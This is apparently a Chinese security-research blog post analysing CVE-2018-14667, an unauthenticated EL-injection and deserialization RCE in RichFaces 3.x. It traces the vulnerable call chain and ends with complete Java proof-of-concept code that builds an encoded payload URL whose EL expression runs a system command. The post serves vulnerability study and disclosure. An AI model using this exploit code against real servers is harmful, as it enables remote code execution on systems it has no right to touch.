@@ -1,0 +1,214 @@
+**作者：lucifaer  
+作者博客：**
+刚开始分析Java的漏洞，很多东西感觉还是有待学习…
+### 0x00 漏洞描述
+> The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression
+> Language (EL) injection via the UserResource resource. A remote,
+> unauthenticated attacker could exploit this to execute arbitrary code using
+> a chain of java serialized objects via
+> org.ajax4jsf.resource.UserResource$UriData.
+根据漏洞描述，可以得知是通过`UserResource`注入EL表达式而造成的rce。而未经身份验证的攻击者可以通过`org.ajax4jsf.resource.UserResource$UriData`的反序列化利用链，完成rce。
+### 0x01 整体触发流程
+    MediaOutputRenderer$doEncodeBegin:54 
+    # 触发createUserResource方法，将序列化内容写到Map映射中
+    BaseFilter$doFilter
+      InternetResourceService$serviceResource:101 # 根据resourceKey获取资源
+        ResourceBuilderImpl$getResourceForKey:217 # 从Map映射中利用键值获取序列化内容
+      InternetResourceService$serviceResource:106 # 根据resourceKey获取资源
+        ResourceBuilderImpl$getResourceDataForKey:227 # 白名单过滤，反序列化
+      InternetResourceService$serviceResource:115 # 触发反序列化方法
+        UserResource$getLastModified:73 # 可被触发的反序列化方法之一
+            ValueExpression$getValue:4 # 执行el表达式
+### 0x02 漏洞分析
+#### 2.1 UserResource
+官方给的描述是通过`UserResource`类进行EL表达式注入的，全局搜一下`UserResource`这个类，定位到`org.ajax4jsf.resource.UserResource`。同样官方说可以用`UriData`进行反序列化利用链的构造，简单看了一下，需要注意的以下三个方法：
+  * `send()`
+  * `getLastModified()`
+  * `getExpired()`
+以上三个方法流程大致相同，挑了`getLastModified`跟一下：
+可以看出能利用`UriData`执行`EL`表达式。跟一下`UriData`是从哪里来的：
+无论怎样最后会获得一个对象，继续跟一下：
+getter/setter方法获值，跟进一下是什么地方赋值的，在`org.ajax4jsf.resource.ResourceContext$serviceResource`
+可以清楚的看出，在
+    resourceContext.setResourceData(resourceDataForKey);
+这里完成了set方法。我们现在跟一下上面的流成，看看`resourceContext`具体是一个什么东西。
+#### 2.2 InternetResourceService
+首先跟一下`getResourceDataForKey`:
+根据继承关系可以看到是在`ResourceBuilderImpl`中实现的：
+首先对`resourceDataForKey`进行了字符串截取，之后将字符串进行解密，最后调用了`LookAheadObjectInputStream`，我们跟一下这个类有什么作用：
+可以看到这个类重写了`resolveClass`方法，也就是说在加载过程中会调用到这个resolveClass方法，并连接到指定的类。在其中有一个`this.isClassValid(desc.getName())`实现了白名单检测：
+可以看到调用了`class.isAssignableFrom`校验反序列化的类，也就是说如果反序列化的类是白名单中类的子类或者接口是可以通过该项校验的。向下看一下，可以发现`whitelistBaseClasses`是从`resource-serialization.properties`中加载的：
+而`UserResource`恰好是`InternetResource`的子类，`UserResource$UriData`是`SerializableResource`的子类：
+所以满足反序列化白名单的要求。
+反过头来看一下之前的字符串解密过程：
+`Coded`中的`d`为`null`，也就是说这个解密过程为
+    base64decode -> zip解密
+现在反序列化流程是我们可以控制的，我们回头看一下组成`resourceContext`的另一部分`resource`的生成过程：
+首先对url进行了截取，之后通过键值关系在Map映射中获取资源。看一下在哪里对Map进行的填充：
+可以看到首先根据生成的path去获取`userResource`，获取不到的话就new一个，然后加入到`resources
+Map`中，也就是说只要我们找到哪里调用了`createUserResource`就可以控制`source`的值。
+查看`createUserResource`的调用点时发现只有`MediaOutputRenderer$doEncodeBegin`调用了该方法。
+#### 2.3 MediaOutputRenderer
+看一下`MediaOutputRenderer`的处理逻辑，首先创建了`userResource`，然后调用了getter的方法获取`userResource`的`Uri`，之后将`Uri`放到了`ResponseWriter`中，我们看一下最后这个`ResponseWriter`最后干了什么：
+将会把`URL`打印到页面上。
+现在我们看一下`getUri`的处理过程：
+调用到了`UserResource$getDataToStore`：
+可以看到主要完成的工作就是将`MediaOutputRenderer`的`component`参数（从代码中可以看出是从标签字段中获得的值）中的一些值提取出来赋值到`UriData`对象中，最后返回`UriData`对象。
+继续跟进一下`getUri`：
+可以看到`storeData`就是`UriData`对象，将其序列化后经过encrypt加密后返回到`resourceURL`中。回看一下反序列化过程：
+也就是我们只需要构造`/DATA/`后的数据就好，`/DATA/`前半段的数据是可以从`url`中获取的：
+至此整个RCE的流程就分析完了。
+### 0x03 构造POC
+梳理整理整个的触发流程，发现该漏洞可执行`getLastModified`、`getExpired`、`send`这三个方法，完成EL表达式的执行，但是他们的触发条件是不同的：
+  * `resource.isCacheable`为`true`触发`getLastModified`、`getExpired`
+  * `resource.isCacheable`为`false`触发`getLastModified`、`send`
+这里解释一下为什么在`resource.isCacheable`为`false`时还会触发`getLastModified`，调用栈如下：
+    InternetResourceService$serviceResource:152 # 进入else处理环节
+      ResourceLifecycle$send:37 # 无论如何都会调用sendResource方法
+      ResourceLifecycle$send:117 # resource.sendHeaders触发getLastModified方法，send触发send方法。
+可以看到最稳定的触发点就是`getLastModified`，接下来的poc也以这个稳定触发点为例。根据在0x01中已经提及的流程，逆向的生成`UriData`，序列化，加密，即可。
+#### 3.1 选择反射生成的对象
+根据[tint0](https://tint0.com/when-el-injection-meets-java-deserialization/)的文章，选择使用`javax.faces.component.StateHolderSaver`来作为反射生成的对象，也就是`modified`对象，使用这个对象的原因是因为这个对象在反序列化失败时可以返回一个`null`对象，最后应用会返回一个200状态码，而当反序列化成功时，就尝试将状态对象转换成一个数组，如果失败时会抛出一个Richface无法捕捉的异常，应用最后返回一个500状态码。利用状态码的不同，可以判断我们的反序列化过程是否成功执行。
+    String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")}";
+    // 根据文章https://www.anquanke.com/post/id/160338
+    Class cls = Class.forName("javax.faces.component.StateHolderSaver");
+    Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
+    ct.setAccessible(true);
+    Location location = new Location("", 0, 0);
+#### 3.2 生成`UriData`
+主要点在于构造`UriData`中的`modified`字段。首先整理生成`modified`所需要的几个条件：
+  1. Date类的对象
+  2. 生成该对象时需要调用一个`ValueExpression`类的`getValue`
+跟一下`getValue`：
+根据继承类来看，右边框内的类都是我们可以利用的，以`TagValueExpression`举例：
+可以看到需要另外一个`ValueExpression`类，并且调用其`getValue`的方法。
+我们首先看该构造函数的第一个需要构造的参数`attr`：
+该类的构造函数为：
+可以看到关键点在于将我们的EL表达式构造到`value`处，其他的参数可以为空。
+接着看第二个需要构造的参数`orig`，这里我们调用另一个`ValueExpressionImpl`类来构造这个`orig`参数：
+跟一下`getNode`和`getValue`：
+下个断动态调一下，发现应如此构造`expr`:
+    pocEL+" modified"
+其他的参数可以为空。这样我们就可以构造一个完整的`TagValueExpression`类，这个类可以执行我们的EL表达式。
+    // 1. 设置UriData
+    //    设置UriData.value
+    Object value = "cve-2018-14667";
+    //    设置UriData.createContent
+    Object createContent = "cve-2018-14667";
+    //    设置UriData.expires
+    Object expires = "cve-2018-14667";
+    //    设置UriData.modified
+    TagAttribute tag = new TagAttribute(location, "", "", "poc", "modified="+pocEL);
+    ValueExpressionImpl valueExpression = new ValueExpressionImpl(pocEL+" modified", null, null, null, Date.class);
+    TagValueExpression tagValueExpression = new TagValueExpression(tag, valueExpression);
+    Object modified = ct.newInstance(null, tagValueExpression);
+#### 3.3 序列化
+之后的步骤就是利用反射构造一个`UriData`，并进行初始化，同时执行序列化：
+    UserResource.UriData uriData = new UserResource.UriData();
+    Field valueField = uriData.getClass().getDeclaredField("value");
+    valueField.setAccessible(true);
+    valueField.set(uriData, value);
+    Field createContentField = uriData.getClass().getDeclaredField("createContent");
+    createContentField.setAccessible(true);
+    createContentField.set(uriData, createContent);
+    Field expiresField = uriData.getClass().getDeclaredField("expires");
+    expiresField.setAccessible(true);
+    expiresField.set(uriData, expires);
+    Field modifiedField = uriData.getClass().getDeclaredField("modified");
+    modifiedField.setAccessible(true);
+    modifiedField.set(uriData, modified);
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+    objectOutputStream.writeObject(uriData);
+    objectOutputStream.flush();
+    objectOutputStream.close();
+    byteArrayOutputStream.close();
+#### 3.4 加密
+可以直接复制`ResourceBuilderImpl$encrypt`的加密函数，就在`decrypt`的上面：
+    byte[] pocData = byteArrayOutputStream.toByteArray();
+    Deflater compressor = new Deflater(1);
+    byte[] compressed = new byte[pocData.length + 100];
+    compressor.setInput(pocData);
+    compressor.finish();
+    int totalOut = compressor.deflate(compressed);
+    byte[] zipsrc = new byte[totalOut];
+    System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
+    compressor.end();
+    byte[]dataArray = URL64Codec.encodeBase64(zipsrc);
+这里要注意一下顺序，在反序列化前，解密的顺序为base64+zip，那么加密过程就需要zip+base64。
+#### 完整版POC
+    import com.sun.facelets.el.TagValueExpression;
+    import com.sun.facelets.tag.TagAttribute;
+    import com.sun.facelets.tag.Location;
+    import org.ajax4jsf.util.base64.URL64Codec;
+    import org.jboss.el.ValueExpressionImpl;
+    import org.ajax4jsf.resource.UserResource;
+    import java.io.ByteArrayOutputStream;
+    import java.io.ObjectOutputStream;
+    import java.lang.reflect.Constructor;
+    import java.lang.reflect.Field;
+    import java.util.Date;
+    import java.util.zip.Deflater;
+    import javax.faces.context.FacesContext;
+    public class poc {
+        public static void main(String[] args) throws Exception{
+            String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")}";
+            // 根据文章https://www.anquanke.com/post/id/160338
+            Class cls = Class.forName("javax.faces.component.StateHolderSaver");
+            Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
+            ct.setAccessible(true);
+            Location location = new Location("", 0, 0);
+            // 1. 设置UriData
+            //    设置UriData.value
+            Object value = "cve-2018-14667";
+            //    设置UriData.createContent
+            Object createContent = "cve-2018-14667";
+            //    设置UriData.expires
+            Object expires = "cve-2018-14667";
+            //    设置UriData.modified
+            TagAttribute tag = new TagAttribute(location, "", "", "poc", "modified="+pocEL);
+            ValueExpressionImpl valueExpression = new ValueExpressionImpl(pocEL+" modified", null, null, null, Date.class);
+            TagValueExpression tagValueExpression = new TagValueExpression(tag, valueExpression);
+            Object modified = ct.newInstance(null, tagValueExpression);
+            // 2. 序列化
+            UserResource.UriData uriData = new UserResource.UriData();
+            Field valueField = uriData.getClass().getDeclaredField("value");
+            valueField.setAccessible(true);
+            valueField.set(uriData, value);
+            Field createContentField = uriData.getClass().getDeclaredField("createContent");
+            createContentField.setAccessible(true);
+            createContentField.set(uriData, createContent);
+            Field expiresField = uriData.getClass().getDeclaredField("expires");
+            expiresField.setAccessible(true);
+            expiresField.set(uriData, expires);
+            Field modifiedField = uriData.getClass().getDeclaredField("modified");
+            modifiedField.setAccessible(true);
+            modifiedField.set(uriData, modified);
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+            objectOutputStream.writeObject(uriData);
+            objectOutputStream.flush();
+            objectOutputStream.close();
+            byteArrayOutputStream.close();
+            // 3. 加密（zip+base64）
+            //
+            byte[] pocData = byteArrayOutputStream.toByteArray();
+            Deflater compressor = new Deflater(1);
+            byte[] compressed = new byte[pocData.length + 100];
+            compressor.setInput(pocData);
+            compressor.finish();
+            int totalOut = compressor.deflate(compressed);
+            byte[] zipsrc = new byte[totalOut];
+            System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
+            compressor.end();
+            byte[]dataArray = URL64Codec.encodeBase64(zipsrc);
+            // 4. 打印最后的poc
+            String poc = "/DATA/" + new String(dataArray, "ISO-8859-1") + ".jsf";
+            System.out.println(poc);
+        }
+    }
+效果：
+### 0x04 Reference
+  * 
+  * 
+* * *
